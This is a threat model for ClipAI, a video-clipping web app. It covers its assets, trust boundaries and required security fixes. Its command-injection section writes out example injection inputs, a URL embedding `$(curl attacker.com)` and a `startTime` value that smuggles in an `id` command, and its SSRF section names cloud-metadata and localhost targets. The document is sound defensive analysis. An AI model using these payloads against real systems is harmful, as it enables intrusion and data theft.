# Threat Model

## Project Overview

ClipAI is a full-stack Node.js/TypeScript application that converts long YouTube/TikTok videos into short viral clips. The frontend is React 19 + Vite (port 5000), the backend is Express 5 (port 8080). Authentication uses Clerk. The database is PostgreSQL (Replit-managed). Video processing relies on ffmpeg (Nix), yt-dlp (Nix), and a Railway-hosted yt-dlp download API. The app is publicly deployed via Replit autoscale.

## Assets

- **User accounts and sessions** — Clerk-managed. Compromise allows access to a user's clip history.
- **Clip history (clip_jobs table)** — URLs and metadata of processed videos, scoped per user.
- **Application secrets** — `CLERK_SECRET_KEY`, `DATABASE_URL`, `SESSION_SECRET`. Leakage enables auth bypass or database access.
- **Server resources** — CPU, memory, and disk used for ffmpeg/yt-dlp processing. Abuse can cause denial of service.
- **Host filesystem** — temporary files in `/tmp/`. Path traversal could expose or overwrite files.

## Trust Boundaries

- **Browser → API** — All video URLs, format strings, timestamps, and search queries originate from untrusted clients. The server must sanitize before passing to shell commands.
- **API → shell (ffmpeg/yt-dlp)** — URL and user-supplied parameters are embedded in shell commands. Shell injection is the highest-risk boundary.
- **API → Railway/external download APIs** — Server issues outbound HTTP requests with user-supplied URLs. SSRF is a concern.
- **API → PostgreSQL** — All queries use parameterized statements (pg driver); SQL injection is mitigated.
- **Authenticated → Unauthenticated** — `/api/history` requires Clerk auth. Video processing endpoints (`/api/video/*`, `/api/ytdlp/*`) have no authentication.

## Scan Anchors

- Production entry points: `artifacts/api-server/src/routes/videoTools.ts`, `artifacts/api-server/src/routes/ytdlp.ts`, `artifacts/api-server/src/routes/history.ts`
- Highest-risk code areas: shell command construction in `ytdlp.ts` (execAsync with string interpolation), `startTime`/`endTime` in `/video/trim` route, `topic` in `/video/clip-finder`
- Public surface: all `/api/video/*` and `/api/ytdlp/*` endpoints (no auth)
- Authenticated surface: `/api/history` (Clerk `requireAuth` middleware)
- Dev-only: none — all routes are production-reachable

## Threat Categories

### Tampering / Elevation of Privilege (Command Injection)

User-supplied URLs, timestamps, and search topics are passed to `execAsync()` via shell string interpolation. Only double-quote characters are escaped in some places; others receive no escaping at all. Within double-quoted shell strings, `$(command)` and backtick expressions are still evaluated by bash. An attacker can craft a URL like `http://x.com/$(curl attacker.com)` or a `startTime` value containing `"; id #` to execute arbitrary OS commands as the Node.js process user.

**Required guarantees:**
- Shell commands MUST use `spawn()` with an argument array, never `exec()`/`execAsync()` with user-supplied string interpolation.
- All user-controlled values passed to shell commands MUST be validated to contain only expected characters (timestamps: digits/colons/dots; URLs: passed as spawn args).

### Elevation of Privilege (No Auth on Resource-Intensive Endpoints)

All video processing endpoints (`POST /api/video/clip`, `/api/video/trim`, `/api/video/crop-vertical`, `/api/video/extract-audio`, `/api/video/transcript`, `GET /api/ytdlp/info`, `GET /api/ytdlp/formats`, `POST /api/ytdlp/download`, `POST /api/video/clip-finder`) require no authentication. Any unauthenticated user can trigger unlimited ffmpeg/yt-dlp jobs.

**Required guarantee:** Sensitive, resource-intensive endpoints SHOULD require a valid Clerk session.

### Information Disclosure (SSRF)

`validateUrl()` only checks that the scheme is `http:` or `https:`. Internal addresses like `http://localhost:5432/`, `http://127.0.0.1/`, or `http://169.254.169.254/` (cloud metadata) pass validation and are forwarded to external download APIs or fetched directly via the yt-dlp fallback. The `streamDownload` helper follows up to 5 redirects, enabling redirect-chain SSRF.

**Required guarantee:** URL inputs MUST be checked against a host allowlist (e.g., only youtube.com, youtu.be, tiktok.com, vm.tiktok.com) before being used server-side.

### Spoofing (CORS Wildcard with Credentials)

`cors({ credentials: true, origin: true })` mirrors any `Origin` header and allows credentialed cross-origin requests from arbitrary websites. An attacker can craft a malicious page that makes authenticated API calls from a victim's browser.

**Required guarantee:** The CORS `origin` option MUST be set to an explicit allowlist (e.g., the production frontend URL), not `true`.
